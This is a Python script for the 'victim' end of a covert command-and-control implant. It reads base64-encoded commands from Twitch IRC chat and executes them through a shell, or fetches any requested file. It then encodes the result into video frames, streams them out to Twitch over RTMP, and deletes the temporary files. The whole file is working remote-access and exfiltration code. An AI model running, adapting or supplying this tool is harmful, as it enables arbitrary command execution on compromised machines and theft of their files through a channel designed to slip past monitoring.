#!/usr/bin/env python3
import argparse
import base64
import subprocess
import time
import os
import glob
from PIL import Image

from twitch_chat_irc import TwitchChatIRC  # provided IRC module

# --- FFmpeg Command ---
FFMPEG_CMD = (
    'ffmpeg -framerate 1/10 -pattern_type glob -i "*.png" -vf "fps=30" '
    '-c:v libx264 -preset veryslow -crf 0 -pix_fmt gray output.mp4'
)

def get_stream_cmd(streamkey):
    """Return the ffmpeg streaming command with the provided stream key."""
    return (
        f'ffmpeg -re -i output.mp4 -vf "fps=30,format=gray" '
        f'-c:v libx264 -preset veryslow -crf 0 -g 60 '
        f'-f flv rtmp://live.twitch.tv/app/{streamkey}'
    )

def decode_incoming_command(message):
    """
    Base64-decode the incoming message.
    Expected format: "uid:actual_command"
    """
    try:
        decoded = base64.b64decode(message.encode()).decode()
        uid, cmd = decoded.split(":", 1)
        return uid, cmd.strip()
    except Exception as e:
        print("[Victim] Error decoding command:", e)
        return None, None

def execute_system_command(command, output_file):
    """Execute a system command and write stdout+stderr to output_file."""
    try:
        proc = subprocess.run(command, shell=True, capture_output=True, text=True)
        with open(output_file, "w") as f:
            f.write(proc.stdout)
            f.write("\n")
            f.write(proc.stderr)
    except Exception as e:
        with open(output_file, "w") as f:
            f.write(f"Error executing command: {e}")

def create_blank_frame(width=1920, height=1080, filename="blank.png"):
    """
    Create a PNG image where the left half is black and the right half is white.
    Since 'blank.png' sorts before any output images, it will be the first frame.
    """
    img = Image.new("L", (width, height))
    for x in range(width):
        for y in range(height):
            img.putpixel((x, y), 0 if x < width // 2 else 255)
    img.save(filename, format="PNG")
    print(f"[Victim] Blank frame created as {filename}")

def encode_output_to_video(input_file, uid):
    """
    Run encoder.py to convert the input file into one or more PNG images.
    This version calls encoder.py with a unique PNG base name (using uid) so that the header file name
    reflects the current command's UID.
    Then creates a blank PNG and uses the provided ffmpeg command (via glob) to create the MP4 video.
    """
    # Generate a unique PNG output base name.
    encoder_output = f"{uid}_encoded.png"
    encoder_cmd = [
        "python", "encoder.py", input_file, encoder_output,
        "--border", "20", "--req_id", uid
    ]
    subprocess.run(encoder_cmd, check=True)
    
    # Create the blank frame.
    create_blank_frame(width=1920, height=1080, filename="blank.png")
    
    # Run ffmpeg to create the video.
    subprocess.run(FFMPEG_CMD, shell=True, check=True)
    
    return "output.mp4"

def stream_video(streamkey):
    """Stream the video using ffmpeg with the given stream key."""
    stream_cmd = get_stream_cmd(streamkey)
    subprocess.run(stream_cmd, shell=True, check=True)

def cleanup_files():
    """Delete generated PNG and MP4 files."""
    patterns = ["*.png", "output.mp4"]
    for pattern in patterns:
        for f in glob.glob(pattern):
            try:
                os.remove(f)
                print(f"[Victim] Deleted {f}")
            except Exception as e:
                print(f"[Victim] Error deleting {f}: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="Victim: listen on Twitch IRC for commands, execute them, encode output, stream video, and cleanup."
    )
    parser.add_argument("--channel", required=True, help="Twitch channel name to join")
    parser.add_argument("--streamkey", required=True, help="RTMP stream key for streaming")
    args = parser.parse_args()

    chat = TwitchChatIRC()  # Using default (anonymous) credentials.
    processed_uids = set()  # To avoid reprocessing the same command.
    
    try:
        while True:
            print("[Victim] Waiting for a command in chat...")
            messages = chat.listen(args.channel, timeout=60, message_limit=1)
            for msg in messages:
                text = msg.get("message", "").strip()
                uid, command = decode_incoming_command(text)
                if not uid or uid in processed_uids:
                    continue  # Skip if already processed.
                print(f"[Victim] Received command (ID={uid}): {command}")
                processed_uids.add(uid)
                chat.send(args.channel, "OK")
                
                # Always generate a new output file name for this command.
                output_file = f"{uid}_output.txt"
                # Remove existing file if present.
                if os.path.exists(output_file):
                    os.remove(output_file)
                # For file requests, override output_file if the requested file exists.
                if command.startswith("file:"):
                    requested_file = command[len("file:"):].strip()
                    if os.path.exists(requested_file):
                        output_file = requested_file
                    else:
                        with open(output_file, "w") as f:
                            f.write("Requested file not found.")
                else:
                    execute_system_command(command, output_file)
                
                # Encode output into video.
                video_file = encode_output_to_video(output_file, uid)
                chat.send(args.channel, "READY")
                print("[Victim] Sent READY; waiting for OK from attacker...")
                while True:
                    resp = chat.listen(args.channel, timeout=10, message_limit=1)
                    if any(m.get("message", "").strip() == "OK" for m in resp):
                        print("[Victim] Received OK; starting stream.")
                        break
                    time.sleep(1)
                stream_video(args.streamkey)
                print("[Victim] Streaming completed. Cleaning up temporary files and awaiting next command...")
                cleanup_files()
    except KeyboardInterrupt:
        print("\n[Victim] Exiting.")
    finally:
        chat.close_connection()

if __name__ == "__main__":
    main()
